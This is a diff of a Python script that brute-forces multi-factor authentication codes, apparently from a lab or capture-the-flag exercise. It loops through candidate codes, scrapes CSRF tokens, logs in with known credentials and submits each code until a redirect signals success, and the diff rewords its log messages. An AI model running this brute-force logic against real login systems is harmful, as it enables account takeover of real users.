@@ -23,10 +23,11 @@ def get_csrf_token(response):
         soup = BeautifulSoup(response.text, "html.parser")
         csrf_token = soup.find("input", {"name": "csrf"})
         if csrf_token is None or "value" not in csrf_token.attrs:
-            print("Failed to retrieve CSRF token. Retrying...")
+            print(f"Failed to retrieve CSRF token from {response.url}. Retrying...")
+            return None
         return csrf_token["value"]
     except Exception as e:
-        print(f"Failed to retrieve CSRF token from {url}: {e}")
+        print(f"Error parsing CSRF token from {response.url}: {e}")
         return None
     
 
@@ -38,13 +39,13 @@ for mfa_code in mfa_codes:
     response = session.get(f"{base_url}{endpoints[0]}", verify=ca_cert_path, timeout=10)
     csrf_token = get_csrf_token(response)
     if int(mfa_code) % 250 == 0:
-        print(f"CSRF token at ogin endpoint: {csrf_token}")
+        print(f"CSRF token at /login endpoint: {csrf_token}")
         print(f"Status code: {response.status_code}")
 
     payload = {"csrf": csrf_token, "username": username, "password": password}
     response = session.post(f"{base_url}{endpoints[0]}", data=payload, verify=ca_cert_path, allow_redirects=False, timeout=10)
     if int(mfa_code) % 250 == 0:
-        print(f"Attempting login... using session cookies: {session.cookies.get_dict()}")
+        print(f"Entering login credentials... using session cookies: {session.cookies.get_dict()}")
         print(f"Status code: {response.status_code}")
 
     if response.status_code != 302:  # Login failed
@@ -57,13 +58,13 @@ for mfa_code in mfa_codes:
         print(response.status_code)
         break
     if int(mfa_code) % 250 == 0:
-        print(f"Login successful. CSRF token: {csrf_token}")
+        print(f"Credentials verified. MFA code sent to email. CSRF token: {csrf_token}")
         print(f"Status code: {response.status_code}")
 
     payload = {"csrf": csrf_token, "mfa-code": mfa_code}
     response = session.post(f"{base_url}{endpoints[1]}", data=payload, verify=ca_cert_path, allow_redirects=False, timeout=10)
     if int(mfa_code) % 250 == 0:
-        print(f"Testing MFA code: {mfa_code}, Status: {response.status_code}")
+        print(f"Brute-forcing with generated MFA code: {mfa_code}, Status: {response.status_code}")
         print(f"Session cookies: {session.cookies.get_dict()}")
             
     if response.status_code == 302:  # Successful MFA bypass
@@ -75,9 +76,9 @@ for mfa_code in mfa_codes:
         break
 
 if found_flag:
-    print(f"Successfully bypassed MFA with code: {last_code_attempted}")
+    print(f"Successfully bypassed MFA with brute-force. Code: {last_code_attempted}")
 else:
-    print("No valid MFA code found.")
+    print("No valid MFA code found. Brute-force attack unsuccessful.")
     print(f"Last code attempted: {last_code_attempted}")
     
 print("Closing session...")
